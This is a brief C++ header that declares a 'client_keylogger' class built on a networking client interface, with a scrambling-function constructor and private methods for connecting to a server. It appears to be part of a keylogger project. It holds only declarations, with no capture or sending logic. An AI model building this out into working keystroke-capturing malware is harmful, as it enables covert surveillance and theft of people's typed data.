#include "common.h"
#include "kqnet.h"


class client_keylogger : public kq::client_interface<messageType> {
  public:
    client_keylogger(uint64_t (*scrambleFunc)(uint64_t));
    ~client_keylogger();

  private:
    bool connectToServer();
    void connectInnit();
};
